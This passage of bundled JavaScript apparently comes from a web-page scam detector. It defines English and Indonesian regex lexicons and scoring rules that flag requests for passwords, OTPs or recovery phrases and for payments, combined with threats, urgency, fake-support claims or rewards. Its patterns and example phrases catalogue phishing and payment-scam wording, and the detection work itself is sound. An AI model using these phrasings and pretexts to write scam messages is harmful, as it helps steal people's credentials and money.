    entry2("cred.id.secret.token", "S.TOKEN", "id", "strong", `${B}token\\s+(?:akses|sesi|login)${E}`, ["token akses"])
  ], DISCLOSURE = [
    // Giving a secret to a person or channel. Legitimate services ask you to type codes into their own form, never to send them on.
    entry2(
      "cred.en.send",
      "D.SEND",
      "en",
      "strong",
      `${B}(?:send|share|give|tell|forward|text|dm|message|read\\s+out|reply\\s+with|respond\\s+with|post|comment|paste\\s+(?:it\\s+)?(?:here|below|in\\s+the\\s+(?:chat|comments?|reply|thread)))(?:\\s+(?:me|us|him|her|them|the\\s+agent|our\\s+(?:team|agent)|support|it))?${E}`,
      ["send", "share", "reply with", "tell me", "post", "paste it here"]
    ),
    entry2(
      "cred.id.send",
      "D.SEND",
      "id",
      "strong",
      `${B}(?:(?:kirim|mengirim)(?:kan)?|kirimin|(?:mem)?bagikan|(?:mem)?berikan|(?:mem)?beri(?:tahu|kan)|kasih(?:\\s+(?:tau|tahu|liat|lihat))?|(?:sebutkan|menyebutkan|sebutin)|(?:mem)?bacakan|bacain|balas\\s+dengan|tulis(?:kan|in)?\\s+di\\s+(?:kolom\\s+)?komentar|japri|dm|spill|fotoin|ss(?:in)?|screenshot(?:in)?|(?:me|di)?teruskan|dibagikan|berbagi)${E}`,
      ["kirimkan", "teruskan", "diteruskan", "dibagikan", "berbagi", "mengirim", "kirimin", "berikan", "memberikan", "kasih tau", "kasih liat", "sebutkan", "sebutin", "balas dengan", "spill"]
    ),
    // A requester asking the reader for the secret ("kami memerlukan kode", "petugas meminta kata sandi"). Only with a requester
    // as subject: "untuk login Anda memerlukan kode" describes a sign-in step.
    entry2(
      "cred.id.ask",
      "D.SEND",
      "id",
      "strong",
      `${B}(?:kami|saya|aku|admin|petugas|agen|tim\\s+\\p{L}+|pihak\\s+\\p{L}+|cs)\\s+(?:(?:sedang|akan|hanya)\\s+)?(?:memerlukan|membutuhkan|butuh|meminta|minta)${E}`,
      ["kami memerlukan", "admin membutuhkan", "petugas meminta"]
    ),
    // Typing a secret into the page.
    entry2(
      "cred.en.enter",
      "D.ENTER",
      "en",
      "strong",
      `${B}(?:enter|type|input|provide|confirm|submit|fill\\s+in|key\\s+in|re-?enter|paste)${E}`,
      ["Enter", "type", "re-enter", "fill in"]
    ),
    entry2(
      "cred.id.enter",
      "D.ENTER",
      "id",
      "strong",
      `${B}(?:(?:untuk|utk|silakan|silahkan|harap|mohon|wajib|harus|diminta)\\s+memasukk?an|masukkan|masukan|masukin|isi(?:kan|in)?|ketik(?:kan|in)?|input(?:kan|in)?|lengkapi|konfirmasi|tempel(?:kan|in)?)${E}`,
      ["masukkan", "masukin", "isi", "ketik", "untuk memasukkan"]
    )
  ], PRETEXTS = [
    entry2(
      "cred.en.threat",
      "CP.ACCOUNT_THREAT",
      "en",
      "weak",
      `${B}(?:(?:account|wallet|card|mailbox|access|profile|funds)\\s+(?:will\\s+be|has\\s+been|is\\s+being|is|may\\s+be)\\s+(?:permanently\\s+)?(?:suspended|locked|blocked|disabled|deactivated|closed|terminated|deleted|restricted|frozen|compromised)|to\\s+avoid\\s+(?:suspension|deactivation|account\\s+closure|losing\\s+(?:access|your\\s+(?:account|funds))))${E}`,
      ["account will be suspended", "wallet has been restricted", "to avoid suspension"]
    ),
    entry2(
      "cred.id.threat",
      "CP.ACCOUNT_THREAT",
      "id",
      "weak",
      `${B}(?:(?:akun|rekening|kartu|dompet|saldo)(?:nya|\\s+(?:anda|kamu|lu|lo))?\\s+(?:akan\\s+|bakal\\s+|mau\\s+|telah\\s+|sudah\\s+|sedang\\s+)?(?:di)?(?:blokir|nonaktifkan|tutup|bekukan|hapus|tangguhkan|batasi|banned|suspend)|untuk\\s+menghindari\\s+(?:pemblokiran|penonaktifan|penutupan)|kena\\s+(?:banned|blokir|suspend)|(?:akses|login|aktivitas)\\s+(?:[\\p{L}]+\\s+){0,3}?terdeteksi\\s+(?:tidak|tdk|tak|ora)\\s+biasa|aktivitas\\s+(?:tidak|tak)\\s+biasa)${E}`,
      ["akun Anda akan diblokir", "akses dompet digital Anda terdeteksi tidak biasa", "rekening dibekukan", "untuk menghindari pemblokiran", "akunnya bakal disuspend", "kena banned"]
    ),
    // Deadlines; "expires in / valid for N minutes" on real codes is excluded.
    entry2(
      "cred.en.urgency",
      "CP.URGENCY",
      "en",
      "weak",
      `${B}(?:(?<!(?:expires?|valid\\s+for|valid)\\s)within\\s+\\d+\\s+(?:minutes?|hours?|days?)|immediately|right\\s+now|act\\s+now|final\\s+(?:warning|notice)|urgent(?:ly)?|as\\s+soon\\s+as\\s+possible|before\\s+it['\u2019]?s\\s+too\\s+late)${E}`,
      ["within 24 hours", "immediately", "urgent", "final warning"]
    ),
    entry2(
      "cred.id.urgency",
      "CP.URGENCY",
      "id",
      "weak",
      `${B}(?:(?<!(?:berlaku|kedaluwarsa|kadaluarsa|hangus)\\s)dalam\\s+(?:waktu\\s+)?\\d+\\s+(?:menit|jam|hari)|segera|sekarang\\s+juga|peringatan\\s+terakhir|mendesak|hari\\s+ini\\s+juga|cepetan|buruan|cpt|sebelum\\s+(?:expired|kedaluwarsa|hangus|tenggat))${E}`,
      ["dalam 24 jam", "sebelum tenggat", "segera", "sekarang juga", "cepetan", "buruan"]
    ),
    // Claimed identity or authority. Never verified; never escalates on its own.
    entry2(
      "cred.en.support",
      "CP.SUPPORT",
      "en",
      "weak",
      `${B}(?:(?:customer\\s+)?support\\s+(?:team|agent|staff|desk)|(?:security|fraud|it|help\\s*desk|verification)\\s+(?:team|department|agent|officer)|(?:site\\s+|group\\s+)?(?:administrator|moderator)|official\\s+(?:support|team|account|staff|agent)|bank\\s+(?:officer|representative|staff)|on\\s+behalf\\s+of)${E}`,
      ["support team", "Security Team", "moderator", "official support", "bank officer"]
    ),
    entry2(
      "cred.id.support",
      "CP.SUPPORT",
      "id",
      "weak",
      `${B}(?:(?:tim|petugas|staf|admin|agen)\\s+(?:resmi|bank|keamanan|dukungan|support|verifikasi)|customer\\s+service|layanan\\s+pelanggan|pihak\\s+bank|admin\\s+(?:grup|komunitas|forum)|petugas|admin|dukungan\\s+teknis)${E}`,
      ["petugas bank", "petugas", "admin", "tim keamanan", "customer service", "pihak bank"]
    ),
    // Verification framing: normal in MFA, so it only counts together with a send request or a recovery phrase.
    entry2(
      "cred.en.verify",
      "CP.VERIFY",
      "en",
      "weak",
      `${B}(?:verify|validate|confirm|authenticate|re-?activate|synchroni[sz]e|sync|unlock|restore\\s+access\\s+to)\\s+${YOUR}(?:account|identity|wallet|profile|access|ownership)${E}`,
      ["verify your account", "validate your wallet", "sync your wallet"]
    ),
    entry2(
      "cred.id.verify",
      "CP.VERIFY",
      "id",
      "weak",
      `${B}(?:(?:verifikasi|verif|validasi|memvalidasi|konfirmasi|aktivasi\\s+ulang|sinkronisasi|pulihkan|memulihkan)\\s+(?:akun|identitas|dompet|data|kepemilikan|akses)${ANDA}|(?:buat|untuk)\\s+(?:verifikasi|verif))${E}`,
      ["verifikasi akun", "validasi dompet Anda", "verif akun", "buat verifikasi"]
    ),
    entry2(
      "cred.en.reward",
      "CP.REWARD",
      "en",
      "weak",
      `${B}(?:giveaway|airdrop|prize|reward|bonus|refund|claim\\s+your|you['\u2019]?ve\\s+won|you\\s+won)${E}`,
      ["airdrop", "claim your", "you've won"]
    ),
    entry2(
      "cred.id.reward",
      "CP.REWARD",
      "id",
      "weak",
      `${B}(?:hadiah|undian|cashback|klaim|anda\\s+(?:menang|terpilih)|pengembalian\\s+dana)${E}`,
      ["hadiah", "klaim", "pengembalian dana"]
    )
  ], OWN_CONTEXT = [
    entry2("cred.id.awareness", "C.EDUCATIONAL", "id", "strong", AWARENESS_ID, AWARENESS_ID_EXAMPLES),
    entry2("cred.id.impersonation_report", "C.REPORTED", "id", "strong", IMPERSONATION_REPORT_ID, IMPERSONATION_REPORT_ID_EXAMPLES)
  ], SHARED_CONTEXT = LEXICON.filter((e) => e.signal === "C.NEGATION" || e.signal === "C.REPORTED" || e.signal === "C.EDUCATIONAL").map((e) => ({ ...e, signal: e.signal })), CRED_LEXICON = [...SECRETS, ...DISCLOSURE, ...PRETEXTS, ...OWN_CONTEXT, ...SHARED_CONTEXT], CRED_OWN_LEXICON = [...SECRETS, ...DISCLOSURE, ...PRETEXTS];

  // src/core/credential/analyze.ts
  var CRED_DETECTOR_VERSION = "cred-0.3.0-exp", CLAUSE_BREAK2 = new RegExp("[,;:.!?]|(?<![\\p{L}\\p{N}_])(?:and|then|or|but|dan|lalu|kemudian|atau|tapi|tetapi)(?![\\p{L}\\p{N}_])", "u"), SENTENCE_BREAK2 = /[.!?]/u, REQUEST_MAX_GAP = 60, REQUEST_MAX_GAP_BEFORE = 90, SELF_SENDER = /(?:^|[\s,])(?:we|we['’]ll|we['’]ve|kami|sistem|system|aplikasi|akan\s+kami|yang\s+kami|sudah\s+kami|telah\s+kami)(?:\s+(?:will|have|has|just|already|are|akan|sudah|telah|baru(?:\s+saja)?|segera|otomatis))*\s*$/u, TIERS2 = ["observed_instruction", "suspicious_correlation", "manipulative_instruction"], LEVELS2 = ["low", "medium", "high"], EDUCATIONAL2 = LEXICON.filter((e) => e.signal === "C.EDUCATIONAL"), ESCALATING = ["CP.ACCOUNT_THREAT"], SECRET_OF_SIGNAL = {
    "S.PASSWORD": "password",
    "S.OTP": "otp",
    "S.PIN": "pin",
    "S.RECOVERY_CODE": "recovery-code",
    "S.SEED_PHRASE": "recovery-phrase",
    "S.TOKEN": "token"
  }, SECRET_OF_FIELD = {
    password: "password",
    otp: "otp",
    pin: "pin",
    "recovery-code": "recovery-code",
    "secret-phrase": "recovery-phrase"
  }, HIGH_RISK_SECRETS = ["otp", "recovery-code", "recovery-phrase", "token"], CRED_RULES = {
    CR1: { name: "SECRET_TO_THIRD_PARTY", classification: "manipulative_instruction" },
    CR2: { name: "RECOVERY_PHRASE_UNDER_PRETEXT", classification: "manipulative_instruction" },
    CR3: { name: "SECRET_IN_UNTRUSTED_CONTENT", classification: "suspicious_correlation" },
    CR4: { name: "SECRET_UNDER_PRESSURE", classification: "suspicious_correlation" },
    CR5: { name: "OBSERVED_SECRET_REQUEST", classification: "observed_instruction" }
  }, SUMMARY2 = {
    CR1: "This part of the page asks the reader to send a secret (password, code or recovery phrase) to a person or channel. Legitimate services ask you to type codes into their own sign-in form, not to pass them on.",
    CR2: "This part of the page asks for a wallet recovery phrase and wraps the request in a pretext (verification, support, deadline, threat or reward).",
    CR3: "A secret is requested inside user-generated content, a widget or an embedded frame, together with a pretext.",
    CR4: "A secret is requested together with a threat to suspend, lock or close the account.",
    CR5: "A request for a password or code was found with no manipulation signs nearby (for example, an ordinary sign-in or verification step)."
  };
  function kindOfSignal(s) {
    return s.startsWith("S.") ? "secret" : s.startsWith("D.") ? "disclosure" : s.startsWith("CP.") ? "pretext" : s.startsWith("F.") ? "field" : "context";
  }
  function makeObs(src, signal, entryId, nStart, nEnd) {
    let range = src.ref.type === "field" && signal === "F.SECRET_FIELD" ? { start: 0, end: src.text.length } : toOriginalRange(src.norm, nStart, nEnd);
    return {
      src,
      nStart,
      nEnd,
      o: {
        id: "",
        signal,
        kind: kindOfSignal(signal),
        entryId,
        source: src.ref,
        start: range.start,
        end: range.end,
        text: src.text.slice(range.start, range.end),
        regionId: src.region.region.id,
        negated: !1,
        reported: !1,
        ...signal === "F.SECRET_FIELD" && src.field ? { fieldKind: src.field.kind } : {}
      }
    };
  }
  function match(src) {
    let raw = [];
    for (let entry5 of CRED_LEXICON)
      for (let m of src.norm.text.matchAll(entry5.pattern))
        m[0].length > 0 && raw.push({ id: entry5.id, signal: entry5.signal, strong: entry5.strength === "strong", s: m.index, e: m.index + m[0].length });
    raw.sort((a, b) => Number(b.strong) - Number(a.strong) || a.s - b.s || b.e - a.e || a.id.localeCompare(b.id));
    let kept = /* @__PURE__ */ new Map(), out = [];
    for (let r of raw) {
      let spans = kept.get(r.signal) ?? [];
      spans.some(([s, e]) => r.s < e && s < r.e) || (spans.push([r.s, r.e]), kept.set(r.signal, spans), out.push(makeObs(src, r.signal, r.id, r.s, r.e)));
    }
    return out;
  }
  function scopes(regions, forms) {
    let ancestorsOf = new Map(forms.map((f) => [f.containerId, f.ancestorContainerIds ?? []])), out = /* @__PURE__ */ new Map();
    for (let r of regions) {
      let prev = regions[r.index - 1], prevScope = prev ? out.get(prev) : void 0;
      prev && prevScope && !r.unplaced && (ancestorsOf.get(r.region.containerId) ?? []).includes(prev.region.containerId) ? out.set(r, { scope: prevScope.scope, offset: prevScope.offset + prev.blocks.length }) : out.set(r, { scope: r, offset: 0 });
    }
    return out;
  }
  function buildSources2(s, regions) {
    let sources = [], placement = /* @__PURE__ */ new Map();
    for (let r of regions)
      r.blocks.forEach((b, i) => {
        placement.set(b.id, { region: r, pos: i });
        let text = b.text.slice(0, 2e3);
        sources.push({ ref: { type: "block", blockId: b.id }, text, norm: normalize(text), region: r, pos: i, scope: r, spos: i, block: b });
      });
    let firstRegionOf = /* @__PURE__ */ new Map();
    for (let r of regions) firstRegionOf.has(r.region.containerId) || firstRegionOf.set(r.region.containerId, r);
    for (let f of (s.formFields ?? []).slice(0, 200)) {
      let anchor = f.afterBlockId === void 0 ? void 0 : placement.get(f.afterBlockId), place;
      if (anchor && anchor.region.region.containerId === f.containerId) place = { region: anchor.region, pos: anchor.pos + 0.5 };
      else if (firstRegionOf.has(f.containerId)) place = { region: firstRegionOf.get(f.containerId), pos: -0.5 };
      else if (anchor) place = { region: anchor.region, pos: anchor.pos + 0.5 };
      else {
        let region = unplacedRegion(f.containerId, regions.length);
        regions.push(region), firstRegionOf.set(f.containerId, region), place = { region, pos: -0.5 };
      }
      sources.push({ ref: { type: "field", fieldId: f.id }, text: f.label, norm: normalize(f.label), region: place.region, pos: place.pos, scope: place.region, spos: place.pos, field: f });
    }
    let sc = scopes(regions, s.forms ?? []);
    for (let src of sources) {
      let x = sc.get(src.region) ?? { scope: src.region, offset: 0 };
      src.scope = x.scope, src.spos = x.offset + src.pos;
    }
    return sources;
  }
  function bindContext(signals, cues) {
    for (let d of signals) {
      if (d.o.kind !== "disclosure" || d.src.ref.type !== "block") continue;
      if (d.o.signal === "D.SEND" && SELF_SENDER.test(d.src.norm.text.slice(Math.max(0, d.nStart - 30), d.nStart))) {
        d.o.negated = !0;
        continue;
      }
      let sameSrc = cues.filter((c) => c.src === d.src), neg = sameSrc.filter((c) => c.o.signal === "C.NEGATION" && c.nEnd <= d.nStart && d.nStart - c.nEnd <= 40 && !CLAUSE_BREAK2.test(d.src.norm.text.slice(c.nEnd, d.nStart)));
      if (neg.length > 0) {
        d.o.negated = !0, d.boundBy = neg[neg.length - 1];
        continue;
      }
      let rep = sameSrc.find((c) => c.o.signal === "C.REPORTED" && c.nEnd <= d.nStart && !SENTENCE_BREAK2.test(d.src.norm.text.slice(c.nEnd, d.nStart)));
      if (!rep) {
        let region = d.src.region;
        for (let p = Math.floor(d.src.pos) - 1; p >= 0 && d.src.pos - p < 8; p--) {
          let block = region.blocks[p];
          if (!(!block || !/:\s*$/u.test(block.text))) {
            rep = cues.find((c) => c.src.block === block && c.o.signal === "C.REPORTED");
            break;
          }
        }
      }
      rep && (d.o.reported = !0, d.boundBy = rep);
    }
  }
  function textUnits(signals) {
    let units = [];
    for (let d of signals) {
      if (d.o.kind !== "disclosure" || d.o.negated) continue;
      let text = d.src.norm.text, after2 = signals.filter((s) => s.src === d.src && s.o.kind === "secret" && s.nStart >= d.nEnd && s.nStart - d.nEnd <= REQUEST_MAX_GAP && !SENTENCE_BREAK2.test(text.slice(d.nEnd, s.nStart))), before = after2.length > 0 ? [] : signals.filter((s) => s.src === d.src && s.o.kind === "secret" && s.nEnd <= d.nStart && d.nStart - s.nEnd <= REQUEST_MAX_GAP_BEFORE && !SENTENCE_BREAK2.test(text.slice(s.nEnd, d.nStart))), secrets = after2.length > 0 ? after2 : before;
      secrets.length !== 0 && units.push({
        action: d.o.signal === "D.SEND" ? "send" : "enter",
        actionObs: d,
        secretObs: secrets,
        secrets: [...new Set(secrets.map((s) => SECRET_OF_SIGNAL[s.o.signal]))],
        src: d.src,
        isField: !1
      });
    }
    units.sort((a, b) => +(b.action === "send") - +(a.action === "send"));
    let seen = /* @__PURE__ */ new Set();
    return units.filter((u) => {
      if (u.secretObs.every((s) => seen.has(s))) return !1;
      for (let s of u.secretObs) seen.add(s);
      return !0;
    });
  }
  function containerKind(src) {
    let id = src.block?.containerId ?? src.field?.containerId ?? "";
    return id.slice(0, id.indexOf(":") + 1);
  }
  function trustOf(u) {
    let ctx = u.src.block?.ctx ?? u.src.field?.ctx ?? {}, kind = containerKind(u.src), out = [];
    return (kind === "ugc:" || ctx.ugc) && out.push("user-content"), kind === "widget:" && out.push("third-party-widget"), kind === "frame:" && out.push("embedded-frame"), (kind === "dialog:" || ctx.dialog) && out.push("dialog"), (kind === "overlay:" || ctx.overlay) && out.push("overlay"), (ctx.form || u.src.field?.formId) && out.push("form"), out;
  }
  var UNTRUSTED = ["user-content", "third-party-widget", "embedded-frame"];
  function near(src, units) {
    return units.some((u) => u.src.scope === src.scope && Math.abs(u.src.spos - src.spos) < 8);
  }
  function headingEducational(heading) {
    if (!heading) return !1;
    let text = normalize(heading).text;
    return EDUCATIONAL2.some((e) => [...text.matchAll(e.pattern)].length > 0);
  }
  var RULE_RANK2 = { CR1: 0, CR2: 1, CR3: 2, CR4: 3, CR5: 4 }, inQuoteOrCode = (src) => !!(src.block?.ctx?.quote || src.block?.ctx?.code || src.block?.ctx?.pre);
  function scoreOne(u, cluster4, region, signals, cues) {
    let pretexts = signals.filter((p) => p.o.kind === "pretext" && near(p.src, [u]) && (!inQuoteOrCode(p.src) || p.src === u.src)), families = new Set(pretexts.map((p) => p.o.signal)), escalating = ESCALATING.filter((f) => families.has(f)), secrets = new Set(u.secrets), untrusted = trustOf(u).some((t2) => UNTRUSTED.includes(t2)), ruleId, base, cls;
    u.action === "send" ? (ruleId = "CR1", cls = families.size > 0 ? "manipulative_instruction" : "suspicious_correlation", base = families.size > 0 ? "high" : "medium") : secrets.has("recovery-phrase") && families.size > 0 ? [ruleId, cls, base] = ["CR2", "manipulative_instruction", "high"] : untrusted && families.size > 0 ? [ruleId, cls, base] = ["CR3", "suspicious_correlation", escalating.length > 0 && families.size >= 2 ? "high" : "medium"] : escalating.length > 0 ? [ruleId, cls, base] = ["CR4", "suspicious_correlation", families.size >= 2 ? "high" : "medium"] : [ruleId, cls, base] = ["CR5", "observed_instruction", "high"];
    let mods = [];
    !u.isField && u.src.block?.ctx?.quote && mods.push({ id: "C.QUOTED", demoteBy: 2, reason: "The request is inside a quotation.", evidence: [u.actionObs] }), !u.isField && u.actionObs?.o.reported && mods.push({
      id: "C.REPORTED",
      demoteBy: 2,
      reason: "The text reports what someone else was asked to do rather than asking the reader.",
      evidence: u.actionObs.boundBy ? [u.actionObs.boundBy] : []
    }), !u.isField && (u.src.block?.ctx?.code || u.src.block?.ctx?.pre) && mods.push({ id: "C.CODE_EXAMPLE", demoteBy: 2, reason: "The request text is inside a code sample.", evidence: [`block:${u.src.block?.id ?? ""}`] });
    let eduCues = cues.filter((c) => c.o.signal === "C.EDUCATIONAL" && near(c.src, [u])), anchor = u.src.block ?? u.src.region.blocks[Math.max(0, Math.floor(u.src.pos))], eduHeading = anchor && headingEducational(anchor.headingContext) ? [`heading:${anchor.id}`] : [];
    (eduCues.length > 0 || eduHeading.length > 0) && mods.push({ id: "C.EDUCATIONAL", demoteBy: 1, reason: "The surrounding text is educational or awareness material.", evidence: [...eduCues, ...eduHeading] });
    let liveFields = cluster4.filter((f) => f.isField && !(f.src.field?.ctx?.quote || f.src.field?.ctx?.code || f.src.field?.ctx?.pre) && f.secrets.some((x) => secrets.has(x))), overrides = [];
    mods.some((m) => m.id === "C.EDUCATIONAL") && liveFields.length > 0 && overrides.push({
      id: "O.LIVE_SECRET_FIELD",
      suppressed: ["C.EDUCATIONAL"],
      evidence: liveFields.flatMap((f) => f.secretObs),
      reason: "The same part of the page has a working input field for the secret, which a lesson would not need."
    });
    let kept = overrides.length > 0 ? mods.filter((m) => m.id !== "C.EDUCATIONAL") : mods, demotion = Math.min(2, kept.reduce((n, m) => n + m.demoteBy, 0));
    return {
      units: [u],
      primary: u,
      region,
      ruleId,
      ruleClassification: cls,
      pretexts,
      modifiers: kept,
      overrides,
      classification: TIERS2[Math.max(0, TIERS2.indexOf(cls) - demotion)],
      confidence: LEVELS2[Math.max(0, LEVELS2.indexOf(base) - kept.length - overrides.length)]
    };
  }
  function score(units, region, signals, cues) {
    let scored = units.map((u) => scoreOne(u, units, region, signals, cues));
    return { ...[...scored].sort((a, b) => TIERS2.indexOf(b.classification) - TIERS2.indexOf(a.classification) || RULE_RANK2[a.ruleId] - RULE_RANK2[b.ruleId])[0], units, pretexts: [...new Set(scored.flatMap((x) => x.pretexts))] };
  }
  function cluster(units) {
    let sorted = [...units].sort((a, b) => a.src.scope.index - b.src.scope.index || a.src.spos - b.src.spos), out = [];
    for (let u of sorted) {
      let last = out[out.length - 1];
      last && last.region === u.src.scope && u.src.spos - last.units[0].src.spos < 8 ? last.units.push(u) : out.push({ region: u.src.scope, units: [u] });
    }
    return out;
  }
  function refKey2(r) {
    return r.type === "block" ? `b:${r.blockId}` : `f:${r.fieldId}`;
  }
  function analyzeCredentials(snapshot) {
    let regions = buildRegions(snapshot.blocks.slice(0, 5e3)), sources = buildSources2(snapshot, regions), signals = [], cues = [];
    for (let src of sources) {
      for (let ob of match(src)) (ob.o.kind === "context" ? cues : signals).push(ob);
      let kind = src.field?.kind;
      kind && SECRET_OF_FIELD[kind] && signals.push(makeObs(src, "F.SECRET_FIELD", `structural.field.${kind}`, 0, src.norm.text.length));
    }
    bindContext(signals, cues);
    let units = textUnits(signals);
    for (let f of signals)
      f.o.signal !== "F.SECRET_FIELD" || !f.src.field || units.push({ action: "enter", secretObs: [f], secrets: [SECRET_OF_FIELD[f.src.field.kind]], src: f.src, isField: !0 });
    let scored = cluster(units).map((c) => score(c.units, c.region, signals, cues)), used = /* @__PURE__ */ new Set();
    for (let s of scored) {
      for (let u of s.units) {
        u.actionObs && used.add(u.actionObs);
        for (let o of u.secretObs) used.add(o);
      }
      for (let p of s.pretexts) used.add(p);
      for (let m of s.modifiers) for (let e of m.evidence) typeof e != "string" && used.add(e);
    }
    let ordered3 = [...used].sort((a, b) => a.src.scope.index - b.src.scope.index || a.src.spos - b.src.spos || a.nStart - b.nStart || a.o.signal.localeCompare(b.o.signal) || refKey2(a.o.source).localeCompare(refKey2(b.o.source))), idOf = /* @__PURE__ */ new Map();
    ordered3.forEach((o, i) => idOf.set(o, `co${i}`));
    let ids = (list) => [...new Set([...list].map((o) => idOf.get(o)))].sort((a, b) => Number(a.slice(2)) - Number(b.slice(2))), findings = scored.map((s, i) => {
      let firstField = s.units.find((u) => u.src.field?.formId)?.src.field, formDestination = firstField ? snapshot.forms?.find((f) => f.id === firstField.formId)?.destination : void 0, trust = [...new Set(s.units.flatMap(trustOf))], secrets = [...new Set(s.units.flatMap((u) => u.secrets))], pretexts = [...new Set(s.pretexts.map((p) => p.o.signal))].sort(), limitations = [];
      pretexts.includes("CP.SUPPORT") && limitations.push("claimed-identity-unverifiable"), formDestination && limitations.push("destination-not-scored"), trust.some((t2) => UNTRUSTED.includes(t2)) && limitations.push("trust-boundary-heuristic");
      let send = s.primary.action === "send", summary = SUMMARY2[s.ruleId];
      return s.modifiers.length > 0 && (summary += ` Context: ${s.modifiers.map((m) => m.reason).join(" ")}`), s.overrides.length > 0 && (summary += ` Not lowered: ${s.overrides.map((o) => o.reason).join(" ")}`), {
        id: `c${i}`,
        category: "credential_disclosure",
        ruleId: s.ruleId,
        ruleName: CRED_RULES[s.ruleId].name,
        classification: s.classification,
        ruleClassification: s.ruleClassification,
        confidence: s.confidence,
        actionRisk: send || secrets.some((x) => HIGH_RISK_SECRETS.includes(x)) ? "high" : "medium",
        requestedAction: send ? "send" : "enter",
        secretTypes: secrets,
        pretexts,
        trustContext: trust,
        ...formDestination ? { formDestination } : {},
        regionId: s.region.region.id,
        observationIds: ids([...s.units.flatMap((u) => [...u.actionObs ? [u.actionObs] : [], ...u.secretObs]), ...s.pretexts]),
        modifiers: s.modifiers.map((m) => ({ ...m, evidence: m.evidence.map((e) => typeof e == "string" ? e : idOf.get(e)) })),
        overrides: s.overrides.map((o) => ({ ...o, evidence: ids(o.evidence) })),
        limitations,
        summary
      };
    }), verdict = "none";
    for (let f of findings) (verdict === "none" || TIERS2.indexOf(f.classification) > TIERS2.indexOf(verdict)) && (verdict = f.classification);
    return {
      detector: "credential",
      detectorVersion: CRED_DETECTOR_VERSION,
      experimental: !0,
      schemaVersion: 1,
      verdict,
      findings,
      observations: ordered3.map((o) => ({ ...o.o, id: idOf.get(o) }))
    };
  }

  // src/core/payment/lexicon.ts
  function entry3(id, signal, lang, strength, source, examples) {
    return { id, signal, lang, strength, pattern: new RegExp(source, "gu"), examples };
  }
  var NUM = "\\d[\\d.,]*", REQUESTS = [
    // Imperatives and obligations addressed to the reader. Past tense ("paid", "transferred") is a report, not a request.
    entry3(
      "pay.en.pay",
      "PY.PAY",
      "en",
      "strong",
      `${B}(?:pay|make\\s+(?:a\\s+|the\\s+)?payment|transfer|wire|deposit|top\\s+up|send\\s+(?:the\\s+|a\\s+|us\\s+|me\\s+)?(?:money|funds|payment|fee|amount|deposit)|(?:buy|purchase|get)\\s+(?:[\\p{L}\\d$]+\\s+){0,3}?(?:gift|google\\s+play|itunes|steam|apple)\\s+cards?)${E}`,
      ["pay", "make a payment", "transfer", "send the money", "buy three Google Play gift cards"]
    ),
    entry3(
      "pay.id.pay",
      "PY.PAY",
      "id",
      "strong",
      `${B}(?:bayar(?:kan|lah)?|transfer(?:kan|lah)?|tf|lakukan\\s+(?:pembayaran|transfer)|setor(?:kan)?|top\\s*-?up|lunasi|kirim(?:kan)?\\s+(?:uang|dana|biaya|pembayaran)|(?:harus|wajib|perlu|diharuskan|segera|mohon|silakan|cukup)\\s+(?:membayar|mentransfer|menyetor|melunasi|mengirim(?:kan)?\\s+(?:uang|dana|biaya))|beli(?:kan)?\\s+(?:voucher|kartu\\s+hadiah)|(?:di)?wajib(?:kan)?\\s+(?:membeli|dibayar(?:kan)?)|(?:harus|wajib)\\s+(?:sudah\\s+)?di\\s?bayar(?:kan)?)${E}`,
      ["bayar", "transfer", "lakukan pembayaran", "kirimkan uang", "wajib membayar", "belikan voucher", "wajib membeli", "diwajibkan dibayarkan"]
    ),
    // Requests phrased as an obligation, a demand under a condition ("jika tidak membayar") or a balance to fill (pay-0.6.0).
    entry3(
      "pay.id.pay_obligation",
      "PY.PAY",
      "id",
      "strong",
      `${B}(?:selesaikan\\s+pembayaran|(?:jika|kalau|bila|apabila)\\s+(?:tidak|tdk|ga|gak|ora)\\s+(?:membayar|bayar|mentransfer|transfer)|(?:harus|wajib|segera|mohon)\\s+di\\s?(?:kirim|transfer)(?:kan)?|(?:saldo|deposit)\\s+(?:\\p{L}+\\s+)?(?:harus|wajib|perlu)\\s+(?:di)?isi|isi\\s+saldo(?:\\s+akun)?)${E}`,
      ["selesaikan pembayaran", "jika tidak membayar", "harus dikirim", "saldo tugas harus diisi"]
    ),
    // A down payment ("DP 50% dulu", "uang muka"): a request like any other; it needs an amount or a destination (D-102).
    entry3("pay.id.down_payment", "PY.PAY", "id", "strong", `${B}(?:dp|uang\\s+muka|down\\s*payment)(?:\\s+\\d+\\s?%)?(?:\\s+(?:dulu|dl|duluan))?${E}`, ["DP 50% dulu", "uang muka", "DP dl"]),
    // Paying in capital for an "investment" ("setor modal", "investasikan dana", "modal mulai 500rb") (D-102).
    entry3(
      "pay.id.invest_pay",
      "PY.PAY",
      "id",
      "strong",
      `${B}(?:setor(?:kan)?\\s+modal|(?:investasikan|tanamkan)\\s+(?:dana|modal|uang)|modal\\s+(?:awal\\s+)?(?:minimal|hanya|cuma|mulai(?:\\s+dari)?))${E}`,
      ["setor modal", "investasikan dana", "modal awal minimal", "modal mulai dari"]
    ),
    // Phone-credit (pulsa) requests, a bare account handed over to pay into, and a payment routed through someone (pay-0.5.0).
    entry3(
      "pay.id.pulsa",
      "PY.PAY",
      "id",
      "strong",
      `${B}(?:(?:kirim(?:i|in|kan)?|isi(?:kan|in)?|beli(?:kan|in|kn)?|tf(?:in)?)\\s+(?:\\p{L}+\\s+){0,2}?pulsa|ini\\s+(?:no\\.?\\s*)?rek(?:ening)?(?:nya|ku)?|(?:kirim|transfer|tf)(?:kan)?\\s+ke\\s+(?:bank|rek(?:ening)?)|di\\s?transfer\\s+ke\\s+rek(?:ening)?|pembayaran(?:nya)?\\s+(?:harus|agar|supaya|mohon|wajib)\\s+(?:\\p{L}+\\s+)?(?:melalui|lewat|via|ke|di)|(?:hanya|cuma)\\s+(?:melalui|lewat|via|ke)\\s+rek(?:ening)?)${E}`,
      ["kirimin pulsa", "hanya melalui rekening", "isi dl pulsa", "Ini rekeningnya", "Kirim ke Bank", "ditransfer ke rek", "Pembayaran harus melalui"]
    )
  ], OBJECTS = [
    // Amounts: matched to tie a request to money. The value itself is never reported (PayObservation.text is "").
    entry3(
      "pay.amount",
      "PA.AMOUNT",
      "en",
      "strong",
      `${B}(?:(?:rp\\.?|idr|usd|us\\$|\\$|\u20AC|\xA3|eur)\\s?${NUM}(?:\\s?(?:juta|jt|ribu|rb|k|million|thousand))?|${NUM}\\s?(?:juta|jt|ribu|rb)?\\s?(?:rupiah|dollars?|usd|idr|euros?))${E}`,
      ["Rp 150.000", "Rp2 juta", "$49.99", "USD 200", "300 dollars", "500 ribu rupiah"]
    ),
